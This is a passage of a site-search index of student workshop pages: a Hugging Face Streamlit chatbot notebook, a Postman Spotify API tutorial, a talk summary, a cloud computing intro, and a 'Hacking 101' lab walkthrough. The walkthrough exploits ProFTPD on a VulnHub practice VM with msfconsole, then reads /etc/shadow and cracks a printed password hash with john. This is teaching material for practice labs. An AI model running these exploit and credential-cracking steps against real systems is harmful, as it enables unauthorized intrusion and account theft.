message_placeholder = st.empty()\n        full_response = \"\"\n        message_list.append(prompt)\n        conversation = Conversation(text=prompt, past_user_inputs=message_list, generated_responses=response_list)\n        conversation = chatbot(conversation)\n        assistant_response = conversation.generated_responses[-1]\n        response_list.append(assistant_response)\n\n\n        # Simulate stream of response with milliseconds delay\n        for chunk in assistant_response.split():\n            full_response += chunk + \" \"\n            time.sleep(0.05)\n            # Add a blinking cursor to simulate typing\n            message_placeholder.markdown(full_response + \"\u258c\")\n\n        message_placeholder.markdown(full_response)\n    # Add assistant response to chat history\n    st.session_state.messages.append({\"role\": \"assistant\", \"content\": full_response,\"avatar\":\"\ud83e\udd16\"})\n</pre> %%writefile generic_chatbot.py import streamlit as st import random import time from transformers import pipeline, Conversation  chatbot = pipeline(model=\"facebook/blenderbot-400M-distill\")  message_list = [] response_list = []  st.title(\"Generic Chatbot\")  # Initialize chat history if \"messages\" not in st.session_state:     st.session_state.messages = []  # Display chat messages from history on app rerun for message in st.session_state.messages:     with st.chat_message(message[\"role\"],avatar=message[\"avatar\"]):         st.markdown(message[\"content\"])  # Accept user input if prompt := st.chat_input(\"Enter something...\"):     # Add user message to chat history     st.session_state.messages.append({\"role\": \"user\", \"content\": prompt,\"avatar\":\"\ud83e\udd17\"})     # Display user message in chat message container     with st.chat_message(\"user\",avatar='\ud83e\udd17'):         st.markdown(prompt)      # Display assistant response in chat message container     with st.chat_message(\"assistant\",avatar='\ud83e\udd16'):         message_placeholder = st.empty()         full_response = \"\"         message_list.append(prompt)         conversation = Conversation(text=prompt, past_user_inputs=message_list, generated_responses=response_list)         conversation = chatbot(conversation)         assistant_response = conversation.generated_responses[-1]         response_list.append(assistant_response)           # Simulate stream of response with milliseconds delay         for chunk in assistant_response.split():             full_response += chunk + \" \"             time.sleep(0.05)             # Add a blinking cursor to simulate typing             message_placeholder.markdown(full_response + \"\u258c\")          message_placeholder.markdown(full_response)     # Add assistant response to chat history     st.session_state.messages.append({\"role\": \"assistant\", \"content\": full_response,\"avatar\":\"\ud83e\udd16\"}) <pre>Overwriting generic_chatbot.py\n</pre> In\u00a0[\u00a0]: Copied! <pre>!wget -q -O - ipv4.icanhazip.com\n! streamlit run generic_chatbot.py &amp; npx localtunnel --port 8501\n</pre> !wget -q -O - ipv4.icanhazip.com ! streamlit run generic_chatbot.py &amp; npx localtunnel --port 8501 <pre>34.86.46.52\n[##................] - fetchMetadata: sill resolveWithNewModule y18n@5.0.8 chec\nCollecting usage statistics. To deactivate, set browser.gatherUsageStats to False.\n\n\n  You can now view your Streamlit app in your browser.\n\n  Network URL: http://172.28.0.12:8501\n  External URL: http://34.86.46.52:8501\n\nnpx: installed 22 in 10.758s\nyour url is: https://odd-books-make.loca.lt\n  Stopping...\n^C\n</pre> <ol> <li>Check Github</li> <li>Check HuggingFace Spaces</li> </ol> <p>eg : model=\"facebook/blenderbot-400M-distill\"</p> In\u00a0[\u00a0]: Copied! <pre># Use a pipeline as a high-level helper\nfrom transformers import pipeline\n\npipe = pipeline(\"conversational\", model=\"facebook/blenderbot-400M-distill\")\n\nans = pipe('Hi how are you?')\n</pre> # Use a pipeline as a high-level helper from transformers import pipeline  pipe = pipeline(\"conversational\", model=\"facebook/blenderbot-400M-distill\")  ans = pipe('Hi how are you?') <pre>\nNo chat template is defined for this tokenizer - using the default template for the BlenderbotTokenizerFast class. If the default is not appropriate for your model, please set `tokenizer.chat_template` to an appropriate template. See https://huggingface.co/docs/transformers/main/chat_templating for more information.\n\n</pre> <pre>\n---------------------------------------------------------------------------\nAttributeError                            Traceback (most recent call last)\n&lt;ipython-input-29-7861ef620052&gt; in &lt;cell line: 6&gt;()\n      4 pipe = pipeline(\"conversational\", model=\"facebook/blenderbot-400M-distill\")\n      5 \n----&gt; 6 ans = pipe('Hi how are you?')\n\n/usr/local/lib/python3.10/dist-packages/transformers/pipelines/conversational.py in __call__(self, conversations, num_workers, **kwargs)\n    287         elif isinstance(conversations, list) and isinstance(conversations[0], list):\n    288             conversations = [Conversation(conv) for conv in conversations]\n--&gt; 289         outputs = super().__call__(conversations, num_workers=num_workers, **kwargs)\n    290         if isinstance(outputs, list) and len(outputs) == 1:\n    291             return outputs[0]\n\n/usr/local/lib/python3.10/dist-packages/transformers/pipelines/base.py in __call__(self, inputs, num_workers, batch_size, *args, **kwargs)\n   1138             )\n   1139         else:\n-&gt; 1140             return self.run_single(inputs, preprocess_params, forward_params, postprocess_params)\n   1141 \n   1142     def run_multi(self, inputs, preprocess_params, forward_params, postprocess_params):\n\n/usr/local/lib/python3.10/dist-packages/transformers/pipelines/base.py in run_single(self, inputs, preprocess_params, forward_params, postprocess_params)\n   1146         model_inputs = self.preprocess(inputs, **preprocess_params)\n   1147         model_outputs = self.forward(model_inputs, **forward_params)\n-&gt; 1148         outputs = self.postprocess(model_outputs, **postprocess_params)\n   1149         return outputs\n   1150 \n\n/usr/local/lib/python3.10/dist-packages/transformers/pipelines/conversational.py in postprocess(self, model_outputs, clean_up_tokenization_spaces)\n    321         )\n    322         conversation = model_outputs[\"conversation\"]\n--&gt; 323         conversation.add_message({\"role\": \"assistant\", \"content\": answer})\n    324         return conversation\n\nAttributeError: 'str' object has no attribute 'add_message'</pre> In\u00a0[\u00a0]: Copied! <pre>from transformers import Conversation\nconversation = Conversation(\"I'm looking for a movie - what's your favourite one?\")\nans = pipe(conversation)\n</pre> from transformers import Conversation conversation = Conversation(\"I'm looking for a movie - what's your favourite one?\") ans = pipe(conversation) In\u00a0[\u00a0]: Copied! <pre>print(ans)\n</pre> print(ans) <pre>Conversation id: 093afc7a-edd8-488a-bbec-1bba22265344\nuser: I'm looking for a movie - what's your favourite one?\nassistant:  I don't really have a favorite movie, but I do like action movies. What about you?\n\n</pre> In\u00a0[\u00a0]: Copied! <pre>from transformers import BlenderbotTokenizer, BlenderbotForConditionalGeneration\n\n#import model class and tokenizer\nfrom transformers import BlenderbotTokenizer, BlenderbotForConditionalGeneration\n\n#download and setup the model and tokenizer\nmodel_name = 'facebook/blenderbot-400M-distill'\ntokenizer = BlenderbotTokenizer.from_pretrained(model_name)\nmodel = BlenderbotForConditionalGeneration.from_pretrained(model_name)\n\ndef func (message):\n  inputs = tokenizer(message, return_tensors=\"pt\")\n  result = model.generate(**inputs)\n  return tokenizer.decode(result[0])\n</pre> from transformers import BlenderbotTokenizer, BlenderbotForConditionalGeneration  #import model class and tokenizer from transformers import BlenderbotTokenizer, BlenderbotForConditionalGeneration  #download and setup the model and tokenizer model_name = 'facebook/blenderbot-400M-distill' tokenizer = BlenderbotTokenizer.from_pretrained(model_name) model = BlenderbotForConditionalGeneration.from_pretrained(model_name)  def func (message):   inputs = tokenizer(message, return_tensors=\"pt\")   result = model.generate(**inputs)   return tokenizer.decode(result[0]) In\u00a0[\u00a0]: Copied! <pre>ans = func('Hi how are you')\nprint(ans)\n</pre> ans = func('Hi how are you') print(ans) <pre>&lt;s&gt; I'm doing well. How are you? What do you like to do in your free time?&lt;/s&gt;\n</pre>"},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#hugging-face","title":"Hugging Face \ud83e\udd17\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#what-is-hugging-face","title":"What is Hugging Face? \ud83e\udd14\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#why-hugging-face","title":"Why Hugging Face? \ud83d\ude0e\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#lets-get-started","title":"Let's get started! \ud83d\ude80\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#models-httpshuggingfacecomodels","title":"Models (https://huggingface.co/models)\u00b6","text":"<p>Collection of 'state-of-the-art pretrained' models for NLP, vision, audio and many more tasks</p>"},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#datasets-httpshuggingfacecodatasets","title":"Datasets (https://huggingface.co/datasets)\u00b6","text":"<p>Thousands of datasets in more than 100 languages, each dedicated for numerous ML tasks</p>"},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#spaces-httpshuggingfacecospaces","title":"Spaces (https://huggingface.co/spaces)\u00b6","text":"<p>A simple way to host ML demo apps on the HuggingFace Hub. Users can create demos using Gradio, Streamlit or even HTML/CSS/JS.</p>"},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#enough-theory-time-to-build-something","title":"Enough theory! Time to build something \ud83d\udee0\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#transformers","title":"Transformers\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#tokenizers","title":"Tokenizers\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#pipeline","title":"Pipeline\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#models","title":"Models\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#use-cases","title":"Use Cases\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#1-text-classification","title":"1. Text Classification \ud83d\udcac\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#2-image-classification","title":"2. Image Classification \ud83d\uddbc\ufe0f\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#3-text-to-speech","title":"3. Text to speech \ud83d\udd0a\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#lets-create-a-chatbot-using-streamlit-and-huggingface","title":"Let's create a chatbot using streamlit and huggingface! \ud83e\udd16\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#how-to-run-streamlit-in-colab","title":"How to run streamlit in colab?\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#1-click-on-the-generated-link","title":"1. Click on the generated link\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#2-enter-the-ip-address-to-access-the-streamlit-platform","title":"2. Enter the IP address to access the streamlit platform\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#what-to-do-if-you-dont-know-how-to-use-a-model","title":"What to do if you dont know how to use a model? \ud83d\ude16\u00b6","text":""},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#whats-next","title":"What's next?\u00b6","text":"<ol> <li>Learn how how to fine tune these pre-trained models</li> </ol> <p>Official Docs</p> <p>Example Notebook</p> <ol> <li>Get acquainted on how to use transformers in JavaScript</li> </ol> <p>Official Docs</p> <ol> <li>Create an account on HuggingFace and start contributing!</li> </ol> <p>Click here to sign up!</p>"},{"location":"2023-2024/Workshops/02_Hugging_Face_Workshop/#thank-you-for-attending-the-session","title":"Thank You for attending the session! \ud83c\udf8a\u00b6","text":""},{"location":"2023-2024/Workshops/03_Postman_API_102/","title":"What are APIs?","text":"<ul> <li>**A**pplication **P**rogramming **I**nterfaces</li> <li>Simplified interfaces for backend interaction</li> <li>Allows resources and services to be shared across applications, organizations, devices</li> </ul>"},{"location":"2023-2024/Workshops/03_Postman_API_102/#how-do-apis-work","title":"How do APIs work?","text":""},{"location":"2023-2024/Workshops/03_Postman_API_102/#the-restaurant-analogy-a-digital-diner","title":"The Restaurant Analogy: A Digital Diner","text":"<p>In a restaurant, there are the following roles: - The Customer who  requests  an order, - The Waiter who  carries  the order to the Chef, and - The Chef who prepares  the order.</p> <p>These roles translate to the following: - The client (browser/app) requests data or the execution of a service - The API delivers the request to the backend - The server is where the request is processed</p>"},{"location":"2023-2024/Workshops/03_Postman_API_102/#postman-api-102-creating-workflows-with-apis","title":"Postman API 102: Creating Workflows with APIs","text":""},{"location":"2023-2024/Workshops/03_Postman_API_102/#by-the-end-of-the-workshop-you-will","title":"By the end of the workshop, you will:","text":"<ul> <li>Have built a song recommender workflow that looks like this</li> <li>Be able to use OAuth 2.0 Authorization to make requests</li> <li>Be able to call a real-world REST API</li> <li>Be able to use variables and chain multiple API calls to build a workflow</li> <li>Be able to visualize response data</li> </ul>"},{"location":"2023-2024/Workshops/03_Postman_API_102/#step-by-step-walkthrough","title":"Step-by-Step Walkthrough","text":""},{"location":"2023-2024/Workshops/03_Postman_API_102/#step-1-set-up","title":"Step 1: Set-Up","text":"<ul> <li>Create a Spotify account to use the Spotify Web API</li> <li>Use Postman for Web to avoid downloading any software</li> </ul>"},{"location":"2023-2024/Workshops/03_Postman_API_102/#step-2-start-a-new-collection","title":"Step 2: Start a New Collection","text":"<ul> <li> In any workspace, start a new collection and name it \"API 102: Building Workflows with APIs\"</li> </ul>"},{"location":"2023-2024/Workshops/03_Postman_API_102/#step-3-set-up-authorization","title":"Step 3: Set Up Authorization","text":"<ul> <li>From the collection folder APIs 102: Building Workflows with APIs, visit the Authorization tab.</li> <li> Make sure Type is set to OAuth 2.0, and Add auth data to is set to Request Headers.</li> <li>To create a Spotify app, login to the Spotify Developer Dashboard here.</li> <li>From the Dashboard, select Create an app.</li> <li> Give the new app a name (ex: \u201cPostman Song Recommender\u201d), a description, check the checkboxes, and select Create.</li> <li>On the newly created app page, click \u201cShow client secret\u201d to reveal the Client ID and Client Secret.</li> <li> <p> Open the Variables tab in Postman and paste these values into CLIENT_ID and CLIENT_SECRET under the CURRENT VALUE column only.</p> <p>Adding sensitive data under the \"CURRENT VALUE\" column protects values from being accidentally viewed or being shared publicly.</p> </li> <li> <p> In the collection Authorization tab under Configure New Token, give the token a nickname (ex: SPOTIFY). Ensure the Grant Type is set to Authorization Code.</p> </li> <li> From the collection\u2019s Authorization tab, find and copy the Callback URL.</li> <li>Navigate to the Spotify dashboard for your \"postman song recommender\" app and click Edit Settings.</li> <li>Add the Callback URL copied from Postman to the Redirect URL field in the app settings and click Add.</li> <li> Scroll down and click Save to update settings.</li> <li> In Postman, from the collection Authorization tab, make sure  <ul> <li>Auth URL is set to https://accounts.spotify.com/authorize.</li> <li>Access Token URL is set to https://accounts.spotify.com/api/token.</li> </ul> </li> </ul>"},{"location":"2023-2024/Workshops/03_Postman_API_102/#step-4-obtain-an-access-token","title":"Step 4: Obtain an Access Token","text":"<ul> <li>From the collection Authorization tab, click Get New Access Token.</li> <li> Follow any login dialog. If successful, click \u201cProceed\u201d. If something went wrong, ensure nothing is missing from the configuration in the above steps.</li> <li>A dialog with the new access token will appear. Select Use Token in the upper right.</li> <li> You should now see a token under Access Token in the collection Authorization tab.     &gt; If this token expires during your demo session, you can obtain a new token any time by clicking Get New Access Token and following the dialogs again.</li> </ul>"},{"location":"2023-2024/Workshops/03_Postman_API_102/#first-request-get-track-id","title":"First Request: Get Track ID","text":"<ul> <li> In the demo &gt; workflow folder, add a new request called get track id.</li> <li> <p> In the get track id request, set the request URL to: <code>GET {{baseUrl}}/search</code>, where baseUrl is defined as a collection variable with a value of the Spotify API base URL: https://api.spotify.com/v1.     &gt; The double curly braces {{}} allow us to interpolate this variable in our request. You can hover over the orange variable to see the resolved value.</p> </li> <li> <p> Add query params in either the Params tab or directly in the URL.     <pre><code>q=track:{{track}}+artist:{{artist}}\ntype=track\n</code></pre></p> </li> <li> Add <code>track</code> and <code>artist</code> as collection variables on the APIs 102: Building Workflows with APIs &gt; Variables tab. Give the variables a value for a popular song (ex: track=dancing queen, artist=abba).</li> <li>Return to the get track id request and hit Send.</li> <li> The response from Spotify should be an object with a key \u201ctracks\u201d that contains an array called \u201citems\u201d. Each item represents a track, with info about the artist, album, track name, trackId etc.</li> <li> <p>To save these values as collection variables for future use, open the Tests tab on the get track id request.     &gt; We want to get the trackId for the song we searched for. The trackId will help us seed our song recommendations in the next request.</p> <ul> <li> Paste in this Node code in the Tests tab to get the first track and save its trackId to a collection variable. <pre><code>// get the JSON response body \nconst body = pm.response.json();\n\n// get first search result track \nconst firstTrack = body.tracks.items[0]\n\n// save the trackId as a collection variable to use in future request \nconst trackId = firstTrack.id;\n\npm.collectionVariables.set(\"trackId\", trackId);\n</code></pre></li> <li>Hit Send on the get track id request to call the API again. This time the code in the Tests tab will be executed when the response arrives.</li> <li>After making the request, show the collection variables on APIs 102: Building Workflows with APIs. There should now be a trackId with values.</li> </ul> </li> </ul>"},{"location":"2023-2024/Workshops/03_Postman_API_102/#second-request-get-recommendations","title":"Second Request: Get Recommendations","text":"<ul> <li> Create a second request in the workflow folder called get recommendations.</li> <li>This will be a GET request to the Spotify Browse API/<code>recommendations</code> endpoint. Show the documentation, highlighting the <code>seed_tracks</code> query parameter.</li> <li> Set the request URL for the get recommendations request to: <code>GET {{baseUrl}}/recommendations?seed_tracks={{trackId}}</code></li> <li>Send the request.</li> <li>Explore the response. The response is an object with key \u201ctracks\u201d that has a value of an array of recommended tracks based on the seed <code>trackId</code>.</li> </ul>"},{"location":"2023-2024/Workshops/03_Postman_API_102/#visualizing-the-recommendations","title":"Visualizing the Recommendations","text":"<ul> <li>Open the Tests tab on the get recommendations request.</li> <li> Add the below script to parse the response body and get the top three recommendations:     <pre><code>// parse response\nconst body = pm.response.json()\n\n// get the first three recommended tracks\nconst topThreeRecs = body.tracks.slice(0,3)\n\nconsole.log(topThreeRecs)\n</code></pre></li> <li>Save the changes and Send the request again.</li> <li>Open the Postman console from the bottom left of the window.</li> <li>You should see the logged <code>topThreeRecs</code> in the console.</li> <li> Return to the script in the Tests tab. Remove the <code>console.log()</code> statement.</li> <li> Add this code to the script to retrieve the track collection variable that was originally the search term:     <pre><code>// get track name from collection variables\nconst track = pm.collectionVariables.get(track)\n</code></pre></li> <li> Add an HTML template and use Postman's <code>pm.visualizer.set()</code> function to apply the template to Postman's Visualizer tab.     <pre><code>// define an HTML template with variables\n// use {{#each var}}{{/each}} to iterate through an array of data\nconst template = `\n&lt;h3&gt;Discover new tunes!&lt;/h3&gt;\n&lt;p&gt;If you like \"{{track}}\", you'll love:&lt;/p&gt;\n&lt;ul&gt; \n {{#each topThreeRecs}}\n        &lt;li&gt;{{name}} - &lt;a href=\"{{external_urls.spotify}}\"&gt;Play&lt;/a&gt;&lt;/li&gt; \n {{/each}}\n&lt;/ul&gt; \n`\n// set visualizer and pass in variables \npm.visualizer.set(template, { topThreeRecs, track })\n</code></pre></li> <li> The full script in the Tests tab should look like this:     <pre><code>const body = pm.response.json()\nconst topThreeRecs = body.tracks.slice(0,3)\nconst track = pm.collectionVariables.get(track)\n\nconst template = `\n&lt;h3&gt;Discover new tunes!&lt;/h3&gt;\n&lt;p&gt;If you like \"{{track}}\", you'll love:&lt;/p&gt;\n&lt;ul&gt; \n {{#each topThreeRecs}}\n        &lt;li&gt;{{name}} - &lt;a href=\"{{external_urls.spotify}}\"&gt;Play&lt;/a&gt;&lt;/li&gt; \n {{/each}}\n&lt;/ul&gt; \n`\npm.visualizer.set(template, { topThreeRecs, track })\n</code></pre></li> <li>Save the changes. Send the get recommendations request again and open the Visualizer tab.</li> <li>You can listen to the suggested songs quickly from Postman:<ul> <li>Postman for web: right-click the \u201cPlay\u201d link to open in new tab</li> <li>Postman for desktop: click the \u201cPlay\u201d link</li> </ul> </li> </ul>"},{"location":"2023-2024/Workshops/03_Postman_API_102/#running-multiple-requests","title":"Running Multiple Requests","text":"<ul> <li>Click the APIs 102: Building Workflows with APIs collection and open the Variables tab.</li> <li>Update the <code>track</code> and <code>artist</code> variables to a new song.</li> <li> Click Save to save the new variable values.</li> <li>To run all the requests in the workflow folder, click the workflow folder, then Run.</li> <li> Click Run APIs 102: Building Workflow....</li> <li>If all goes well, you will have two <code>status 200</code> responses from your requests. The collection variables have now been updated.</li> <li>To view the visualized response with these new variables, Send the get recommendations request one more time and open the Visualize tab.</li> </ul>"},{"location":"2023-2024/Workshops/03_Postman_API_102/#assignment","title":"Assignment","text":"<p>That's it!</p> <p>Fork the official workshop collection, and complete and submit the \u201cyour turn!\u201d challenge as an assignment.</p>"},{"location":"2023-2024/Workshops/03_Postman_API_102/#challenge-prompt","title":"Challenge Prompt","text":"<p>The blogger wants more accurate song recommendations based on artists they like. Allow the blogger to enter three artists (artist1, artist2, artist3) as collection variables to generate 5 song recommendations in the \"get recommendations\" request.</p>"},{"location":"2023-2024/Workshops/04_Hacking_101_%28HTB_Workshop%29/","title":"Hacking 101 - HTB Workshop","text":"<p>Hack The Box (HTB) is a platform that provides realistic penetration testing labs and challenges, allowing users to practice their cybersecurity skills in a safe environment. The platform offers a wide range of challenges, from web exploitation to reverse engineering, aimed at both beginners and experienced professionals.</p>"},{"location":"2023-2024/Workshops/04_Hacking_101_%28HTB_Workshop%29/#htb-sherlocks-noted-challenge","title":"HTB Sherlocks - 'Noted' Challenge","text":"<p>HTB Sherlocks - Noted</p>"},{"location":"2023-2024/Workshops/04_Hacking_101_%28HTB_Workshop%29/#overview","title":"Overview","text":"<p>The 'Noted' challenge is a cyber sleuthing and analysis challenge that focuses more on Digital Forensics and Incident Response (DFIR) techniques. In this workshop, we will walk through the steps to solve this challenge.</p>"},{"location":"2023-2024/Workshops/04_Hacking_101_%28HTB_Workshop%29/#instructions","title":"Instructions","text":"<ol> <li> <p>Open everything with grep \"aws\" [i]. Go into the folder and then run:     <pre><code>cat * | grep -i \"aws\"\n</code></pre></p> </li> <li> <p>Open the <code>session.xml</code> file to instantly get the filename and path.</p> </li> <li> <p>Open the <code>LootANDPurge</code> file to directly access the zip file.</p> </li> <li> <p>For UTC timestamp conversion, follow these steps:</p> <p>a. Open <code>time.txt</code> to obtain two values.</p> <p>b. Use the following Python formula to convert the timestamps: <pre><code>import datetime\n\ntimestamp_low = -1354503710\ntimestamp_high = 31047188\n\nfull_timestamp = (timestamp_high &lt;&lt; 32) | (timestamp_low &amp; 0xFFFFFFFF)\n\ntimestamp_seconds = full_timestamp / 10**7\ntimestamp = datetime.datetime(1601, 1, 1) + datetime.timedelta(seconds=timestamp_seconds)\n\nprint(timestamp)\n</code></pre> Replace <code>timestamp_low</code> and <code>timestamp_high</code> with the obtained values.</p> </li> </ol>"},{"location":"2023-2024/Workshops/04_Hacking_101_%28HTB_Workshop%29/#additional-steps","title":"Additional Steps","text":"<p>After obtaining the timestamp, proceed with the following steps:</p> <ol> <li>Search on Pastebin to find the Ethereum wallet information.</li> <li>Provide the Tor email address as required.</li> </ol> <p>By following these steps, you will progress through the 'Noted' challenge on HTB Sherlocks.</p>"},{"location":"2023-2024/Workshops/04_Hacking_101_%28HTB_Workshop%29/#offensive-security-basic-pentesting-1","title":"Offensive Security: Basic Pentesting: 1","text":"<p>Link to Challenge: Basic Pentesting: 1 ~ VulnHub</p>"},{"location":"2023-2024/Workshops/04_Hacking_101_%28HTB_Workshop%29/#ports","title":"Ports","text":"<ul> <li>Ports are gateways to protocols and are managed by the operating system.</li> <li>There are 65,535 possible port numbers, with around 1200 commonly used ports and open ports starting from 2300 onwards.</li> </ul>"},{"location":"2023-2024/Workshops/04_Hacking_101_%28HTB_Workshop%29/#downloads","title":"Downloads","text":"<ol> <li>VirtualBox: Downloads \u2013 Oracle VM VirtualBox</li> <li>Kali Linux: Get Kali | Kali Linux</li> <li>Target Machine: Basic Pentesting: 1 ~ VulnHub</li> </ol>"},{"location":"2023-2024/Workshops/04_Hacking_101_%28HTB_Workshop%29/#steps","title":"Steps","text":"<ol> <li>Find the Host IP using <code>ifconfig</code> or <code>ip addr</code> (under eth0).</li> <li>Use <code>netdiscover -r &lt;ip&gt;/&lt;subnet&gt;</code> to find IP and MAC addresses of devices in the network.</li> <li>Target PC is usually under vendor 'PCS Systemtechnik GmbH'.</li> <li>Note down the target PC's IP.</li> <li>Use nmap to find open ports on the target PC:</li> <li><code>nmap &lt;targetIP&gt;</code></li> <li><code>nmap -sV &lt;targetIP&gt;</code></li> <li><code>nmap -sV -sC &lt;targetIP&gt;</code></li> <li><code>nmap -sV &lt;targetIP&gt; -vv</code></li> <li>Check each port for vulnerabilities.</li> <li>Exploit the vulnerable FTP port using msfconsole:    <pre><code>   bash\n   msfconsole\n   search proftpd\n   use 5\n   set RHOSTS &lt;TARGET_IP&gt;\n   set LHOST &lt;your_ip&gt;\n   exploit\n</code></pre></li> <li>You are basically inside the laptop now. However, if you still want to find the password, navigate to /etc/ and decrypt the shadow file using john. <pre><code>        ==marlinspike:\\$6\\$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/==\njohn &lt;file_name&gt;\njohn --show &lt;file_name&gt;\n</code></pre></li> </ol>"},{"location":"2023-2024/Workshops/04_Hacking_101_%28HTB_Workshop%29/#term-gpt","title":"Term-GPT","text":"<ul> <li>nmap :         - Network mapping         - Find all devices within the same network using your ip</li> <li>-sV : Show version</li> <li>-sC : Script scan using default set of scripts</li> </ul>"},{"location":"2023-2024/Workshops/06_PS1_Experience_Talk/","title":"PS1 Experience Talk","text":"<p>GDSC collaborated with the PS Division to host this talk, which saw six seniors, from various disciplines sharing their experience. They offered valuable insights into the selection process of stations, pointed out key skills or tech stack needed to enhance one's CV. Furthermore, the session shed light on the critical skills they developed during their time in the program and the overall benefits they garnered from their participation.</p> <p>The seniors gave a peek into how what they learned in college helped them at work, especially focusing on which courses they took in their first two years of college were useful for their jobs. Attendees were encouraged to ask their queries to the speakers, who answered them to the best of their abilities.</p>"},{"location":"2023-2024/Workshops/06_PS1_Experience_Talk/#speakers-at-the-event","title":"Speakers at the Event:","text":"Name Company Name Online/Offline Discipline Sanvit Katrekar Veehive Online CS Riddhi Goswami Emirates On-site CS Avani Kottalgi Fidelity Insurance Introduced, On-site CS Rishabh Somani Indian Oil Corporation Introduced, On-site Chemical Tvisha Sethi Cipla Introduced, On-site Biotech Saanchi Kasar Unique World Robotics On-site Biotech"},{"location":"2023-2024/Workshops/06_PS1_Experience_Talk/#recording","title":"Recording:","text":"<p>Link to Recording</p>"},{"location":"2023-2024/Workshops/07_Intro_to_Cloud/","title":"\ud83d\udcc4 Introduction to Cloud Computing","text":""},{"location":"2023-2024/Workshops/07_Intro_to_Cloud/#overview","title":"\ud83d\udccb Overview","text":"<p>Welcome to the \"Introduction to Cloud Computing\" workshop! In this session, we will explore the world of cloud computing and its applications. Cloud computing has revolutionized the way businesses and individuals store, manage, and process data. This workshop aims to provide you with a solid foundation in cloud computing concepts, services, and benefits. </p>"},{"location":"2023-2024/Workshops/07_Intro_to_Cloud/#objectives","title":"\ud83c\udfaf Objectives","text":"<p>By the end of this workshop, you will:</p> <ul> <li>Understand the fundamental concepts of cloud computing. </li> <li>Learn about different cloud service models and deployment models.</li> <li>Explore popular cloud service providers such as AWS, GCP and Azure. </li> <li>Gain hands-on experience with cloud resources and services such as AWS Amplify and AWS S3 Buckets.</li> <li>Understand the difference between IaaS and PaaS</li> <li>Understand the benefits and challenges of cloud adoption. </li> </ul>"},{"location":"2023-2024/Workshops/07_Intro_to_Cloud/#prerequisites","title":"\ud83d\udd0d Prerequisites","text":"<p>To participate in this workshop, you should have a basic understanding of computer systems. Please ensure you have the following requirements met:</p> <ul> <li>pythonanywhere Account</li> <li>AWS Account</li> <li>Credit Card Details to signup for AWS.</li> </ul>"},{"location":"2023-2024/Workshops/07_Intro_to_Cloud/#workshop-outline","title":"\ud83d\ude80 Workshop Outline","text":"<ol> <li>Pre - Cloud Era and its Difficulties   <pre><code>  graph LR\n  A[Paying for Underutilized Resources] --&gt; B[Host and Maintaining our own Servers]\n  B --&gt; C[Disaster Management and Availability]\n  C --&gt; D[Lack of MicroServices]</code></pre></li> <li> <p>What are Micro services? Independent and Simple Cloud based tools which are integrated into your infrastructure.   | Service | Description |   |---|---|   | AWS Lambda | Serverless compute service that automatically scales based on demand/traffic. |   | AWS SES | Email sending service for marketing campaigns, transactional emails, or any other type of email. |   | AWS IAM | Identity and Access Management service for controlling user access to AWS resources. It organizes users into roles and groups for easier management. |   | AWS Secrets Manager | Secure storage service for sensitive information like passwords, API keys, and database credentials. |</p> </li> <li> <p>Cloud Fundamentals   <pre><code>graph LR\n    A[What] --&gt; B[How]\n    B --&gt; C[Why]\n    C --&gt; D[Impact]</code></pre></p> </li> <li> <p>Introduction to Cloud Computing</p> <ul> <li>Overview of cloud computing and its importance: <ul> <li>Cloud Computing is defined as the practice of using remote servers hosted on the internet to store, manage and process data rather than using a local. </li> </ul> </li> <li>Benefits and challenges of adopting cloud services.  <pre><code>graph TB\nA[Cloud Computing] --&gt; B[On-demand Network Access]\nA --&gt; C[Resource Pooling]\nA --&gt; D[Rapid Elasticity]\nA --&gt; E[Measured Service]\nB --&gt; F[Access Services Anytime]\nB --&gt; G[Connectivity from Anywhere]\nC --&gt; H[Shared Infrastructure]\nC --&gt; I[Multi-tenancy]\nD --&gt; J[Scale Resources Up or Down]\nD --&gt; K[Pay for Actual Usage]\nE --&gt; L[Monitor and Optimize Performance]\nE --&gt; M[Pay for Actual Usage]</code></pre></li> </ul> </li> <li> <p>Cloud Service Models</p> <ul> <li>Infrastructure as a Service (IaaS)</li> <li>Platform as a Service (PaaS)</li> <li> <p>Software as a Service (SaaS)</p> Category Service Model Examples IAAS Infrastructure as a Service Amazon EC2, Azure Blob Storage, Google Cloud VPC SAAS Software as a Service Gmail, Google Docs, Salesforce PAAS Platform as a Service Heroku, Azure App Service, AWS RDS </li> </ul> </li> <li> <p>Cloud Deployment Models</p> <ul> <li>Public, private, hybrid, and multi-cloud environments. </li> <li>Considerations for choosing a deployment model. </li> </ul> Cloud Deployment Models Considerations Public Cloud Scalability, Cost, Convenience Private Cloud Control, Security, Compliance Hybrid Cloud Flexibility, Data Sovereignty, Cost Multi-cloud Vendor Lock-In, Redundancy, Data Portability </li> <li> <p>Popular Cloud Service Providers</p> <ul> <li>Amazon Web Services (AWS)</li> <li>Google Cloud Platform (GCP) </li> <li>Microsoft Azure  <pre><code>graph LR\nE[Cloud Service Providers] --&gt; 